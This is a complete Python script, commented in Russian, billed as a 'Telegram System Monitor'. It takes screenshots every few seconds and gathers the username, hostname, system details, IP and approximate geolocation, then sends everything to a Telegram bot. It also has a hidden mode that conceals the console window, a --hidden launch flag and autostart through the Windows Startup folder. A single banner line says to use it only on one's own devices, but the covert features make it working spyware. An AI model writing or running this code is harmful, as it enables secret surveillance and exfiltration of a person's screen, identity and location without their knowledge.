#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Telegram System Monitor - Single File Application
Отправляет скриншоты и информацию о системе в Telegram
"""

import os
import sys
import time
import json
import platform
import requests
import socket
import threading
import getpass
from datetime import datetime
from io import BytesIO


# Проверка и установка зависимостей
def check_and_install_dependencies():
    required_packages = {
        'PIL': 'pillow',
        'psutil': 'psutil',
        'requests': 'requests'
    }

    missing_packages = []
    for package, install_name in required_packages.items():
        try:
            __import__(package if package != 'PIL' else 'PIL.Image')
        except ImportError:
            missing_packages.append(install_name)

    if missing_packages:
        print("Установка недостающих зависимостей...")
        import subprocess
        for package in missing_packages:
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                print(f"Установлен: {package}")
            except:
                print(f"Ошибка установки {package}. Установите вручную: pip install {package}")

        # Перезапуск после установки
        print("\nПерезапуск приложения...")
        os.execv(sys.executable, [sys.executable] + sys.argv)


# Вызываем проверку зависимостей
check_and_install_dependencies()

# Теперь импортируем всё после проверки
from PIL import ImageGrab
import psutil


class TelegramSystemMonitor:
    def __init__(self, config_file="telegram_monitor_config.json"):
        self.config_file = config_file
        self.config = self.load_config()
        self.running = False
        self.screenshot_interval = self.config.get('interval', 10)

    def load_config(self):
        """Загрузка конфигурации"""
        default_config = {
            'bot_token': '',
            'chat_id': '',
            'interval': 10,
            'startup': False,
            'hidden': False
        }

        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r', encoding='utf-8') as f:
                    config = json.load(f)
                    # Обновляем только существующие ключи
                    for key in default_config:
                        if key in config:
                            default_config[key] = config[key]
            except:
                pass

        return default_config

    def save_config(self):
        """Сохранение конфигурации"""
        try:
            with open(self.config_file, 'w', encoding='utf-8') as f:
                json.dump(self.config, f, indent=4, ensure_ascii=False)
            return True
        except:
            return False

    def send_to_telegram(self, text=None, image_bytes=None, filename=None, is_document=False):
        """Отправка данных в Telegram"""
        try:
            if not self.config['bot_token'] or not self.config['chat_id']:
                return False

            if image_bytes and not is_document:
                # Отправка фото (скриншота)
                url = f"https://api.telegram.org/bot{self.config['bot_token']}/sendPhoto"
                files = {'photo': ('screenshot.png', image_bytes)}
                data = {'chat_id': self.config['chat_id']}
                if text:
                    data['caption'] = text
            elif filename and is_document:
                # Отправка документа
                with open(filename, 'rb') as f:
                    url = f"https://api.telegram.org/bot{self.config['bot_token']}/sendDocument"
                    files = {'document': (os.path.basename(filename), f)}
                    data = {'chat_id': self.config['chat_id']}
                    if text:
                        data['caption'] = text
            elif text:
                # Отправка текста
                url = f"https://api.telegram.org/bot{self.config['bot_token']}/sendMessage"
                files = None
                data = {'chat_id': self.config['chat_id'], 'text': text}
            else:
                return False

            response = requests.post(url, files=files, data=data, timeout=10)
            return response.status_code == 200

        except Exception as e:
            if not self.config.get('hidden', False):
                print(f"Ошибка отправки: {e}")
            return False

    def get_system_info(self):
        """Сбор информации о системе"""
        try:
            info_lines = []
            info_lines.append("=" * 50)
            info_lines.append("СИСТЕМНАЯ ИНФОРМАЦИЯ")
            info_lines.append("=" * 50)
            info_lines.append(f"Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            info_lines.append(f"Пользователь: {getpass.getuser()}")
            info_lines.append(f"Компьютер: {socket.gethostname()}")
            info_lines.append(f"ОС: {platform.system()} {platform.release()}")
            info_lines.append(f"Версия: {platform.version()}")
            info_lines.append(f"Архитектура: {platform.machine()}")
            info_lines.append(f"Процессор: {platform.processor() or 'Неизвестно'}")

            # Память
            memory = psutil.virtual_memory()
            info_lines.append(f"Память всего: {memory.total / (1024 ** 3):.1f} GB")
            info_lines.append(f"Память использовано: {memory.percent}%")
            info_lines.append(f"Загрузка CPU: {psutil.cpu_percent()}%")

            # Диски
            info_lines.append("\nДИСКИ:")
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    info_lines.append(f"  {partition.device} ({partition.fstype}):")
                    info_lines.append(f"    Всего: {usage.total / (1024 ** 3):.1f} GB")
                    info_lines.append(f"    Использовано: {usage.percent}%")
                except:
                    pass

            # Сеть
            info_lines.append("\nСЕТЬ:")
            try:
                hostname = socket.gethostname()
                ip = socket.gethostbyname(hostname)
                info_lines.append(f"IP: {ip}")
            except:
                info_lines.append("IP: Недоступно")

            # Процессы
            info_lines.append(f"\nПроцессов запущено: {len(psutil.pids())}")

            # Геолокация (приблизительная по IP)
            info_lines.append("\nГЕОЛОКАЦИЯ (приблизительная):")
            try:
                response = requests.get('http://ip-api.com/json/', timeout=5)
                if response.status_code == 200:
                    geo = response.json()
                    if geo['status'] == 'success':
                        info_lines.append(f"Страна: {geo.get('country', 'Неизвестно')}")
                        info_lines.append(f"Город: {geo.get('city', 'Неизвестно')}")
                        info_lines.append(f"Регион: {geo.get('regionName', 'Неизвестно')}")
                        info_lines.append(f"Провайдер: {geo.get('isp', 'Неизвестно')}")
                        info_lines.append(f"Координаты: {geo.get('lat', '?')}, {geo.get('lon', '?')}")
            except:
                info_lines.append("Информация о местоположении недоступна")

            return "\n".join(info_lines)

        except Exception as e:
            return f"Ошибка сбора информации: {str(e)}"

    def take_screenshot(self):
        """Создание скриншота в памяти"""
        try:
            screenshot = ImageGrab.grab()
            img_byte_arr = BytesIO()
            screenshot.save(img_byte_arr, format='PNG')
            img_byte_arr.seek(0)
            return img_byte_arr.getvalue()
        except Exception as e:
            if not self.config.get('hidden', False):
                print(f"Ошибка скриншота: {e}")
            return None

    def monitor_loop(self):
        """Основной цикл мониторинга"""
        last_info_sent = 0
        info_interval = 60  # Отправлять информацию каждую минуту

        while self.running:
            try:
                current_time = time.time()

                # Скриншот
                screenshot_data = self.take_screenshot()
                if screenshot_data:
                    caption = f"🖥️ {socket.gethostname()} - {datetime.now().strftime('%H:%M:%S')}"
                    self.send_to_telegram(
                        text=caption,
                        image_bytes=screenshot_data
                    )

                # Системная информация (каждую минуту)
                if current_time - last_info_sent >= info_interval:
                    system_info = self.get_system_info()
                    # Сохраняем во временный файл
                    temp_file = "system_info_temp.txt"
                    with open(temp_file, 'w', encoding='utf-8') as f:
                        f.write(system_info)

                    self.send_to_telegram(
                        text="📊 Обновление системной информации",
                        filename=temp_file,
                        is_document=True
                    )

                    # Удаляем временный файл
                    try:
                        os.remove(temp_file)
                    except:
                        pass

                    last_info_sent = current_time

                time.sleep(self.screenshot_interval)

            except Exception as e:
                if not self.config.get('hidden', False):
                    print(f"Ошибка в цикле мониторинга: {e}")
                time.sleep(self.screenshot_interval)

    def start_monitoring(self):
        """Запуск мониторинга"""
        if not self.config['bot_token'] or not self.config['chat_id']:
            print("Ошибка: Не настроены токен бота и/или chat_id!")
            return False

        self.running = True

        # Начальное сообщение
        start_msg = f"""🚀 Мониторинг запущен!
Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Компьютер: {socket.gethostname()}
Пользователь: {getpass.getuser()}
Интервал скриншотов: {self.screenshot_interval} сек.
        """
        self.send_to_telegram(text=start_msg)

        # Первоначальная информация о системе
        system_info = self.get_system_info()
        temp_file = "system_info_start.txt"
        with open(temp_file, 'w', encoding='utf-8') as f:
            f.write(system_info)

        self.send_to_telegram(
            text="📋 Полная информация о системе",
            filename=temp_file,
            is_document=True
        )

        try:
            os.remove(temp_file)
        except:
            pass

        # Запуск потока мониторинга
        monitor_thread = threading.Thread(target=self.monitor_loop)
        monitor_thread.daemon = True
        monitor_thread.start()

        if not self.config.get('hidden', False):
            print("=" * 50)
            print("Мониторинг запущен!")
            print(f"Скриншоты отправляются каждые {self.screenshot_interval} секунд")
            print("Информация о системе отправляется каждую минуту")
            print("Для остановки нажмите Ctrl+C")
            print("=" * 50)

        # Ожидание остановки
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_monitoring()

        return True

    def stop_monitoring(self):
        """Остановка мониторинга"""
        self.running = False
        stop_msg = f"""🛑 Мониторинг остановлен
Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Компьютер: {socket.gethostname()}
        """
        self.send_to_telegram(text=stop_msg)

        if not self.config.get('hidden', False):
            print("\nМониторинг остановлен")
            print("Все файлы очищены")


class ConfigGUI:
    """Графический интерфейс для настройки"""

    def __init__(self):
        self.monitor = TelegramSystemMonitor()

    def show_menu(self):
        """Показать текстовое меню"""
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            print("=" * 50)
            print("TELEGRAM SYSTEM MONITOR")
            print("=" * 50)
            print()

            # Текущие настройки
            bot_token = self.monitor.config['bot_token']
            chat_id = self.monitor.config['chat_id']

            print("Текущие настройки:")
            print(f"1. Токен бота: {'***' + bot_token[-8:] if bot_token else 'Не задан'}")
            print(f"2. Chat ID: {chat_id if chat_id else 'Не задан'}")
            print(f"3. Интервал: {self.monitor.config['interval']} сек.")
            print(f"4. Запуск с Windows: {'Да' if self.monitor.config['startup'] else 'Нет'}")
            print(f"5. Скрытый режим: {'Да' if self.monitor.config['hidden'] else 'Нет'}")
            print()
            print("=" * 50)
            print("МЕНЮ:")
            print("1. Настроить токен бота")
            print("2. Настроить Chat ID")
            print("3. Изменить интервал скриншотов")
            print("4. Включить/выключить автозапуск")
            print("5. Включить/выключить скрытый режим")
            print("6. Запустить мониторинг")
            print("7. Тестовое сообщение")
            print("8. Справка")
            print("0. Выход")
            print("=" * 50)

            choice = input("\nВыберите действие: ").strip()

            if choice == '1':
                self.configure_bot_token()
            elif choice == '2':
                self.configure_chat_id()
            elif choice == '3':
                self.configure_interval()
            elif choice == '4':
                self.toggle_startup()
            elif choice == '5':
                self.toggle_hidden()
            elif choice == '6':
                self.start_monitoring()
            elif choice == '7':
                self.send_test_message()
            elif choice == '8':
                self.show_help()
            elif choice == '0':
                print("Выход...")
                break
            else:
                print("Неверный выбор!")
                time.sleep(1)

    def configure_bot_token(self):
        """Настройка токена бота"""
        print("\n" + "=" * 50)
        print("НАСТРОЙКА ТОКЕНА БОТА")
        print("=" * 50)
        print("\nКак получить токен:")
        print("1. Откройте Telegram")
        print("2. Найдите @BotFather")
        print("3. Отправьте /newbot")
        print("4. Следуйте инструкциям")
        print("5. Скопируйте токен (выглядит как: 1234567890:ABCdefGHIjklMnOprSTUvWXYz)")
        print("=" * 50)

        current = self.monitor.config['bot_token']
        if current:
            print(f"\nТекущий токен: ***{current[-8:]}")
            change = input("Изменить? (y/n): ").lower()
            if change != 'y':
                return

        token = input("\nВведите новый токен бота: ").strip()
        if token:
            self.monitor.config['bot_token'] = token
            self.monitor.save_config()
            print("Токен сохранен!")
        else:
            print("Токен не изменен.")

        input("\nНажмите Enter для продолжения...")

    def configure_chat_id(self):
        """Настройка Chat ID"""
        print("\n" + "=" * 50)
        print("НАСТРОЙКА CHAT ID")
        print("=" * 50)
        print("\nКак получить Chat ID:")
        print("1. Откройте Telegram")
        print("2. Найдите @userinfobot")
        print("3. Отправьте /start")
        print("4. Скопируйте ваш ID")
        print("=" * 50)

        current = self.monitor.config['chat_id']
        if current:
            print(f"\nТекущий Chat ID: {current}")
            change = input("Изменить? (y/n): ").lower()
            if change != 'y':
                return

        chat_id = input("\nВведите Chat ID: ").strip()
        if chat_id:
            self.monitor.config['chat_id'] = chat_id
            self.monitor.save_config()
            print("Chat ID сохранен!")
        else:
            print("Chat ID не изменен.")

        input("\nНажмите Enter для продолжения...")

    def configure_interval(self):
        """Настройка интервала"""
        print(f"\nТекущий интервал: {self.monitor.config['interval']} секунд")
        try:
            interval = int(input("Введите новый интервал (секунды, мин. 5): ").strip())
            if interval >= 5:
                self.monitor.config['interval'] = interval
                self.monitor.save_config()
                self.monitor.screenshot_interval = interval
                print(f"Интервал изменен на {interval} секунд")
            else:
                print("Интервал должен быть не менее 5 секунд")
        except ValueError:
            print("Неверный формат числа!")

        input("\nНажмите Enter для продолжения...")

    def toggle_startup(self):
        """Включение/выключение автозапуска"""
        current = self.monitor.config['startup']
        self.monitor.config['startup'] = not current

        # Для Windows: добавление в автозагрузку
        if os.name == 'nt':
            startup_folder = os.path.join(os.getenv('APPDATA'),
                                          'Microsoft', 'Windows', 'Start Menu',
                                          'Programs', 'Startup')
            shortcut_path = os.path.join(startup_folder, 'TelegramMonitor.lnk')

            if self.monitor.config['startup']:
                # Создаем ярлык
                try:
                    import winshell
                    from win32com.client import Dispatch

                    exe_path = sys.executable if not getattr(sys, 'frozen', False) else sys.argv[0]
                    target = exe_path if getattr(sys, 'frozen', False) else sys.executable
                    args = ' --hidden' if self.monitor.config['hidden'] else ''

                    shell = Dispatch('WScript.Shell')
                    shortcut = shell.CreateShortCut(shortcut_path)
                    shortcut.Targetpath = target
                    shortcut.Arguments = f'"{exe_path}"{args}' if not getattr(sys, 'frozen', False) else args
                    shortcut.WorkingDirectory = os.path.dirname(exe_path)
                    shortcut.save()
                    print("Добавлено в автозагрузку Windows")
                except:
                    print("Не удалось добавить в автозагрузку")
            else:
                # Удаляем ярлык
                try:
                    if os.path.exists(shortcut_path):
                        os.remove(shortcut_path)
                    print("Удалено из автозагрузки Windows")
                except:
                    print("Не удалось удалить из автозагрузки")
        else:
            print(f"Автозапуск {'включен' if self.monitor.config['startup'] else 'выключен'}")

        self.monitor.save_config()
        input("\nНажмите Enter для продолжения...")

    def toggle_hidden(self):
        """Включение/выключение скрытого режима"""
        current = self.monitor.config['hidden']
        self.monitor.config['hidden'] = not current
        self.monitor.save_config()

        print(f"Скрытый режим {'включен' if self.monitor.config['hidden'] else 'выключен'}")
        print("В скрытом режиме приложение не показывает окна и сообщения")

        input("\nНажмите Enter для продолжения...")

    def start_monitoring(self):
        """Запуск мониторинга"""
        if not self.monitor.config['bot_token'] or not self.monitor.config['chat_id']:
            print("Ошибка: Сначала настройте токен бота и Chat ID!")
            input("\nНажмите Enter для продолжения...")
            return

        print("\nЗапуск мониторинга...")
        print("Для остановки нажмите Ctrl+C в консоли")

        # Скрываем консоль в скрытом режиме
        if self.monitor.config['hidden'] and os.name == 'nt':
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

        self.monitor.start_monitoring()

    def send_test_message(self):
        """Отправка тестового сообщения"""
        if not self.monitor.config['bot_token'] or not self.monitor.config['chat_id']:
            print("Ошибка: Сначала настройте токен бота и Chat ID!")
        else:
            print("Отправка тестового сообщения...")
            success = self.monitor.send_to_telegram(
                text=f"✅ Тест мониторинга\nВремя: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nКомпьютер: {socket.gethostname()}"
            )
            if success:
                print("Тестовое сообщение отправлено успешно!")
            else:
                print("Ошибка отправки тестового сообщения!")

        input("\nНажмите Enter для продолжения...")

    def show_help(self):
        """Показать справку"""
        print("\n" + "=" * 50)
        print("СПРАВКА")
        print("=" * 50)
        print("\nЧто делает приложение:")
        print("1. Отправляет скриншоты экрана в Telegram")
        print("2. Отправляет информацию о системе:")
        print("   - Характеристики компьютера")
        print("   - Использование ресурсов")
        print("   - Приблизительное местоположение")
        print("   - Сетевую информацию")
        print("\nКак использовать:")
        print("1. Получите токен бота у @BotFather")
        print("2. Получите Chat ID у @userinfobot")
        print("3. Настройте приложение через меню")
        print("4. Запустите мониторинг")
        print("\nДля остановки: Ctrl+C в консоли")
        print("=" * 50)

        input("\nНажмите Enter для продолжения...")


def main():
    """Главная функция"""
    # Проверка аргументов командной строки
    args = sys.argv[1:]

    if '--hidden' in args:
        # Запуск в скрытом режиме
        monitor = TelegramSystemMonitor()
        monitor.config['hidden'] = True
        monitor.load_config()

        if monitor.config['bot_token'] and monitor.config['chat_id']:
            if os.name == 'nt':
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

            monitor.start_monitoring()
        else:
            print("Ошибка: Не настроены токен бота и/или chat_id!")
            print("Запустите приложение без --hidden для настройки")
            time.sleep(5)
    else:
        # Обычный запуск с меню
        gui = ConfigGUI()
        gui.show_menu()


if __name__ == "__main__":
    # Информация о версии
    print("Telegram System Monitor v1.0")
    print("Автор: System Monitoring Tool")
    print("Используйте только на своих устройствах!\n")

    # Небольшая задержка для чтения информации
    time.sleep(2)

    main()